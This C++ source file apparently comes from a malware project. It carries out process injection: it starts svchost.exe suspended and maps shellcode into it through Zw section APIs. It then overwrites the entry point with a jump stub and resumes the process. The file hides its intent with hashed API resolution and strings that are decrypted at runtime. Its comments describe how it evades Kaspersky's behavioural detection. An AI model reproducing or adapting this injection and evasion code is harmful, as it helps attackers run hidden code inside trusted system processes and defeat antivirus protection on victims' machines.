/*
	ProcessInjectMP.cpp
 Process injection routines, multi-platform, using C-shellcode from special project
*/


#include <windows.h>


#include "dbg.h"
#include "mem.h"
#include "HashedStrings.h"
#include "MyStringRoutines.h"
#include "CryptoStrings.h"
#include "DynImports.h"
//#include "RandomGen.h"



#include "ProcessInjectMP.h"



// global var with dyn loaded apis
ProcessInjectMPAPIs wiPIObj;

const UINT64 i64Ntdll_PI_APIHashes[] = {
	HASHSTR("ZwQueryInformationProcess", 0x2e0c8efb80c66f11),
	HASHSTR("ZwReadVirtualMemory", 0xb0f4795174f3dc7a),
	HASHSTR("ZwCreateSection", 0x550d836dda8c8ce4),
	HASHSTR("ZwMapViewOfSection", 0x7fdb27ed419b267f),
	HASHSTR("ZwUnmapViewOfSection", 0x0b8298ce8fcc2b28)
};

const UINT64 i64Kernel32_PI_APIHashes[] = {
	HASHSTR("DebugActiveProcess", 0x1a3922f735b30e5c),
	HASHSTR("DebugActiveProcessStop", 0xad2628dae83a0160),
	HASHSTR("CreateProcessW", 0x62fc6548645c91a1),
	HASHSTR("DebugSetProcessKillOnExit", 0x4f76629d3a355653),
	HASHSTR("ResumeThread", 0xd1357be6ee0e207c),
	HASHSTR("GetSystemDirectoryW", 0xc86c1c1a0fa6cb63)
};










VOID pimpCheckInitObj()
{
	HMODULE hLib;

	if (wiPIObj.wStrucSize != sizeof(ProcessInjectMPAPIs)) {

		// need to init/load obj
		if (hLib = GetModuleHandleByHash( HASHSTR("ntdll.dll", 0xcaa334e7c715a062) )) {

			// load apis

			// ntdll
			LoadAPIs(hLib, (PUINT64)&i64Ntdll_PI_APIHashes, sizeof(i64Ntdll_PI_APIHashes) / sizeof(UINT64), (LPVOID)&wiPIObj.pi_ZwQueryInformationProcess );

			// kernel32
			if (hLib = GetModuleHandleByHash( HASHSTR("kernel32.dll", 0x5fb644a978cd76ea))) {
				LoadAPIs(hLib, (PUINT64)&i64Kernel32_PI_APIHashes, sizeof(i64Kernel32_PI_APIHashes) / sizeof(UINT64), (LPVOID)&wiPIObj.pi_DebugActiveProcess );
			}

			// set init ok flag
			wiPIObj.wStrucSize = sizeof(ProcessInjectMPAPIs);

		} else { DbgPrint("ERR: failed to get module handle"); } // hLib ok


	} // init check
}


// exctracts information about EP offset from loaded image 
SIZE_T GetEP(LPVOID pPEImage)
{
	IMAGE_DOS_HEADER *idh = NULL;
	IMAGE_NT_HEADERS *inh = NULL;

	//DbgPrint("pPEImage=%04Xh", pPEImage);

	__try {

		idh = (IMAGE_DOS_HEADER *)pPEImage;
		inh = (IMAGE_NT_HEADERS *)((BYTE*)pPEImage + idh->e_lfanew);

		return (inh->OptionalHeader.AddressOfEntryPoint);

	} __except(1) { DbgPrint("WARN: exception catched"); return 0; }

}

SIZE_T GetSizeOfImage(LPVOID pPEImage)
{
	IMAGE_DOS_HEADER *idh = NULL;
	IMAGE_NT_HEADERS *inh = NULL;

	__try {

		idh = (IMAGE_DOS_HEADER *)pPEImage;
		inh = (IMAGE_NT_HEADERS *)((BYTE*)pPEImage + idh->e_lfanew);

		return (inh->OptionalHeader.SizeOfImage);

	} __except(1) { DbgPrint("WARN: exception catched"); return 0; }

}

/*
	Read from hProcess (first mem chunk) and query it's imagesize from PE header
*/
DWORD _pimpGetSizeOfImage(HANDLE hProcess, LPVOID pImageBase)
{
	LPVOID pHeaders;	// buff to contain headers from remote process
	DWORD dwResult = 0;	// function result
	DWORD dwRead;

	// define needed mem chunk len as 0x1000
	pHeaders = my_alloc(0x1000);

	if ( wiPIObj.pi_ZwReadVirtualMemory(hProcess, pImageBase, pHeaders, 0x1000, &dwRead)  ) { DbgPrint("ZwReadVirtualMemory for header from imgbase failed with code %04Xh", GetLastError()); return 0;  }
	DbgPrint("header read ok");
	
	dwResult = GetSizeOfImage(pHeaders);
	DbgPrint("res %04Xh", dwResult);

	// free mem
	my_free(pHeaders);

	return dwResult;
}



/*
	Prepare shellcode with passed dll, map it into target process using section
 and place jmp at EP in local buffer passed
*/
BOOL PlaceShellcodeAndJmp(INJECT_CONTEXT *ic)
{
	BOOL bRes = FALSE;	// func's result

	// section related
	HANDLE hSection = NULL;
	LARGE_INTEGER a = { ic->lInjectionChunkLen, 0 };
	LPVOID pLocalMem = NULL;					// locally mapped mem for section
	SIZE_T lLocalMemLen = ic->lInjectionChunkLen;	// it's ^ size

	JumpCode jcJumpCode = { 0 };

__try {

	DbgPrint("pRemoteImage_EP=%04Xh", ic->pRemoteImage_EP);

	// create section
//	a.HighPart = 0;
//	a.LowPart = (DWORD)lInjectionChunkLen;
	if ( wiPIObj.pi_ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL) ) { DbgPrint("ZwCreateSection failed"); return bRes; } 
	DbgPrint("section created");

	// map it to local process
//	pLocalMem = NULL;
//	lLocalMemLen = lInjectionChunkLen;
	if ( wiPIObj.pi_ZwMapViewOfSection(hSection, (HANDLE)-1, &pLocalMem, 0, NULL, NULL, &lLocalMemLen, 1, NULL, PAGE_EXECUTE_READWRITE) ) { DbgPrint("ZwMapViewOfSection(1) failed"); return bRes; }  
	DbgPrint("section mapped locally at %04Xh, len=%u", pLocalMem, lLocalMemLen);

	// copy prepare buffer there
	memcpy(pLocalMem, ic->pInjectionChunk, ic->lInjectionChunkLen);
	DbgPrint("shellcode written");

	// map section to remote process
	pLocalMem = NULL;	// use any addr
	if (wiPIObj.pi_ZwMapViewOfSection(hSection, ic->hTargetProcess, &pLocalMem, 0, NULL, NULL, &lLocalMemLen, 1, NULL, PAGE_EXECUTE_READWRITE)) { DbgPrint("ZwMapViewOfSection(2) failed"); return bRes; }
	DbgPrint("shellcode mapped in target process at %04Xh", pLocalMem);

	// prepare jump code structure
	memset(&jcJumpCode, 0, sizeof(JumpCode) );

#if defined(_M_X64)
	/* 
		x64 EP patch
		
		48b9 xxxxxxxxxxxxxxxxx mov rcx, PARAM
		48b8 xxxxxxxxxxxxxxxxx MOV RAX, EXEC_PTR
		ffe0 JMP RAX
	*/
	jcJumpCode.wMovRaxOpcode = 0xb848;
	jcJumpCode.wMovRcxOpcode = 0xb948;
	jcJumpCode.wJmpRaxOpcode = 0xe0ff;
	jcJumpCode.ulParam = (SIZE_T)pLocalMem;
	jcJumpCode.ulExecAddr = (SIZE_T)pLocalMem + ic->lShellcodeEntryOffset;

#else
	/*
		x32 EP patch
		push param1	// shellcode's entry param, ptr to SHELLCODE_CONTEXT, currently start of the buffer itself
		push param2	// pseudo-ret addr
		push param3	// target ret addr
		ret
	*/
	jcJumpCode.bPushOpcode1 = 0x68;
	jcJumpCode.bPushOpcode2 = 0x68;
	jcJumpCode.bPushOpcode3 = 0x68;
	jcJumpCode.bRetOpcode = 0xc3;
	jcJumpCode.dwPushArg1 = (DWORD)pLocalMem;	
	jcJumpCode.dwPushArg2 = (DWORD)pLocalMem + (DWORD)ic->lShellcodeEntryOffset;
	jcJumpCode.dwPushArg3 = (DWORD)pLocalMem + (DWORD)ic->lShellcodeEntryOffset;
#endif

	// place code at image's entrypoint
	memcpy(ic->pRemoteImage_EP, &jcJumpCode, sizeof(JumpCode));
	DbgPrint("jmp written to local buff at %04Xh len %u", &jcJumpCode, sizeof(JumpCode));

	// save ok result
	bRes = TRUE;

} __except(1) { DbgPrint("WARN: exception catched"); }

	return bRes;
}

/*
// check if OS version is XP or earlier
BOOL bIsWindowsXP()
{
	BOOL bRes = TRUE;
	OSVERSIONINFO vi;

	memset(&vi, 0, sizeof(OSVERSIONINFO));
	vi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (GetVersionEx(&vi)) {
		if (vi.dwMajorVersion > 5) { bRes = FALSE; DbgPrint("greater than XP found"); }
	}

	return bRes;
}
*/



// NB: if not all image will be re-mapped, process will crash on attempt to load 
// user32.dll in attempt to access removed memory region

#if defined(_M_X64)
	#define PROCESS_BASIC_INFORMATION_XX PROCESS_BASIC_INFORMATION64
	#define PEB_ImageBaseAddress_Offset 0x10
#else
	#define PROCESS_BASIC_INFORMATION_XX PROCESS_BASIC_INFORMATION32
	#define PEB_ImageBaseAddress_Offset 0x08
#endif


/*
	Attempts to execute passed dll inside of a remote process
	NB: in case of pReserved -1 specified, shellcode will pass to client dll ptr to ShellcodeEntryParams structure
	pExtraData & lExtraDataLen specifies extra data structure to be embedded at ShellcodeEntryParams at bExtraData. pReserved is ignored in such case
*/
BOOL AttemptSvchostInjection(INJECT_CONTEXT *ic)
{
	BOOL bRes = FALSE;	// func result
	LPWSTR wszTargetExe = NULL;	// path and name of target exec injection
	LPWSTR wszS;	// decryption buff

	// CreateProcess() params
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOW si = { 0 };

	// to query PEB of remote process
	PROCESS_BASIC_INFORMATION_XX pbi;

	LPVOID pImageBase = NULL;	// imagebase ptr at remote process

	ULONG dwRead = 0;	// ZwReadVirtualMemory() read result 

	LPVOID pRemoteImage = NULL;	// remote code image
//	LPVOID pRemoteImage_EP = NULL; // entrypoint at ^ buffer

	// section related
	LARGE_INTEGER a;
	HANDLE hSection;
	LPVOID pMem = NULL;
	SIZE_T dwSize;

	ULONG ulFinalProt = PAGE_EXECUTE_READWRITE;	// prots used at final page map, turned to R for greater than XP os

	DWORD dwImageSize = 0;	// len of image of target svchost process, vary for different OS versions
							// queried from PE header


	DbgPrint("entered");

	do {	// not a loop

		__try {

			// check/load imports
			pimpCheckInitObj();

			// query system directory + svchost.exe
			wszTargetExe = (LPWSTR)my_alloc(10240);
			if (!wiPIObj.pi_GetSystemDirectoryW(wszTargetExe, 10240 - 1)) { DbgPrint("GetSystemDirectory failed"); break; }


			// decrypt name part and concat
			// NB: decryption of %SYSTEM%\svchost.exe will trigger KIS emulator
			wszS = CRSTRW("\\svchost.exe", "\xfd\xff\x53\x04\xf1\xff\x6f\x1f\xfb\xe4\xbb\xe3\x1e\x13\xdd\xc9\x35\x22\x37");
			lstrcatW(wszTargetExe, wszS);
			my_free(wszS);

			DbgPrint("wszTargetExe=[%ws], creating process", wszTargetExe);

			// try to create suspended process
			si.cb = sizeof(STARTUPINFOW);

			// NB: to partially bypass KIS from untrusted process, it is essential to block NtWriteVirtualMemory() triggered somewhere inside of following CreateProcessW()
			if (!wiPIObj.pi_CreateProcessW(wszTargetExe, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED + DETACHED_PROCESS + CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { DbgPrint("CreateProcess failed"); break; }

			DbgPrint("CreateProcess ok: pid=%u(0x%02Xh), querying PEB", pi.dwProcessId, pi.dwProcessId);
			ic->hTargetProcess = pi.hProcess;

			// query PEB of target process
			memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));
			if (wiPIObj.pi_ZwQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL)) { DbgPrint("ZwQueryInformationProcess failed, code %04Xh", GetLastError()); break; }

			DbgPrint("remote PEB located at %04Xh", pbi.PebBaseAddress);

			// read PEB.ImageBaseAddress

			if (wiPIObj.pi_ZwReadVirtualMemory(pi.hProcess, (LPVOID)(pbi.PebBaseAddress + PEB_ImageBaseAddress_Offset), &pImageBase, sizeof(LPVOID), &dwRead)) { DbgPrint("ZwReadVirtualMemory for imgbase failed with code %04Xh", GetLastError()); break; }
			DbgPrint("remote pImageBase located at %04Xh", pImageBase);

			// check len of image to be re-mapped
			if (!(dwImageSize = _pimpGetSizeOfImage(pi.hProcess, pImageBase))) { DbgPrint("ERR: failed to query size of img"); break; }


			// alloc buffer to hold EP chunk of target module
			// NB: size is hardcoded especially for svchost !
			pRemoteImage = my_alloc(dwImageSize);

			// read remote image 
			if (wiPIObj.pi_ZwReadVirtualMemory(pi.hProcess, pImageBase, pRemoteImage, dwImageSize, &dwRead)) { DbgPrint("ZwReadVirtualMemory for code from imgbase failed with code %04Xh", GetLastError()); break; }
			DbgPrint("read %04Xh bytes", dwRead);

			// get EP from image (in-mem value is relative to imagebase, not absolute)
			ic->pRemoteImage_EP = (LPVOID)((SIZE_T)pRemoteImage + GetEP((CHAR *)pRemoteImage));

			DbgPrint("pRemoteImage=%04Xh pRemoteImage_EP=%04Xh (EP in target process resides at %04Xh)", pRemoteImage, ic->pRemoteImage_EP, (SIZE_T)((SIZE_T)pImageBase + GetEP((CHAR *)pRemoteImage)));

			// place jmp to shellcode at pRemoteImage_EP, and link it to a newly mapped section with shellcode
			if (!PlaceShellcodeAndJmp(ic)) { DbgPrint("PlaceShellcodeJmp failed"); break; }
			DbgPrint("PlaceShellcodeAndJmp done, about to pi_ZwCreateSection()");

			// create section to hold modified image
			a.HighPart = 0;
			a.LowPart = dwImageSize;
			if (wiPIObj.pi_ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) { DbgPrint("ZwReadVirtualMemory failed"); break; }

			// map to local process
			DbgPrint("about to pi_ZwMapViewOfSection()");
			pMem = NULL;
			dwSize = dwImageSize;
			if (wiPIObj.pi_ZwMapViewOfSection(hSection, (HANDLE)-1, &pMem, NULL, NULL, NULL, &dwSize, 1, NULL, PAGE_EXECUTE_READWRITE)) { DbgPrint("ZwMapViewOfSection failed (1)"); break; }

			// copy contents to mapping
			DbgPrint("about to memcpy()");
			memcpy(pMem, pRemoteImage, dwImageSize);
			my_free(pRemoteImage);	// not needed anymore


			// init remote process params
			/*ulFinalProt = PAGE_EXECUTE_READ;
			if (DebugActiveProcess(piPI.dwProcessId)) {

			// allow process run after debug detached
			DebugSetProcessKillOnExit(FALSE);

			Sleep(100);

			//DebugActiveProcessStop(piPI.dwProcessId);

			} else { DbgPrint("ERR: failed to start process debug, code %04Xh", GetLastError()); }*/



			//	MessageBox(0, L"OK to unmap original EP", L"query", MB_OK);

			// unmap original EP chunk
			DbgPrint("about to pi_ZwUnmapViewOfSection()");
			if (wiPIObj.pi_ZwUnmapViewOfSection(pi.hProcess, pImageBase)) { DbgPrint("ZwUnmapViewOfSection failed"); break; }

			// NB: this triggers KIS PDM:Trojan.Win32.Generic, and on next syscall (ResumeThread) or some wait, process will be killed
			// in case of PAGE_EXECUTE_READWRITE flag here. But with PAGE_EXECUTE_READ flag process will crash at ntdll init phase unless 
			// we force that init by debugging break in and out before map replacement
			DbgPrint("about to pi_ZwMapViewOfSection(2)");
			pMem = pImageBase;
			dwSize = dwImageSize;
			if (wiPIObj.pi_ZwMapViewOfSection(hSection, pi.hProcess, &pMem, NULL, NULL, NULL, &dwSize, 1, NULL, ulFinalProt)) { DbgPrint("ZwMapViewOfSection failed (2)"); break; }

			// NB: looks like VirtualProtectEx() unable to change protections for mapped mem - returns STATUS_INVALID_PARAM

			// run it
#ifdef _DEBUGx
			DbgPrint("about to ResumeThread()");
			MessageBoxW(NULL, L"about to resumt", NULL, MB_ICONINFORMATION);
#endif
			if (-1 != wiPIObj.pi_ResumeThread(pi.hThread)) { bRes = TRUE; DbgPrint("resumed OK"); }

		} __except (1) { DbgPrint("WARN: exception catched"); }

	} while (FALSE);	// not a loop

	// cleanups
	if ((!bRes) && (pi.hProcess)) { DbgPrint("terminating process due to some error during injection"); TerminateProcess(pi.hProcess, 0); }
	if (wszTargetExe) { my_free(wszTargetExe); }


	return bRes;
}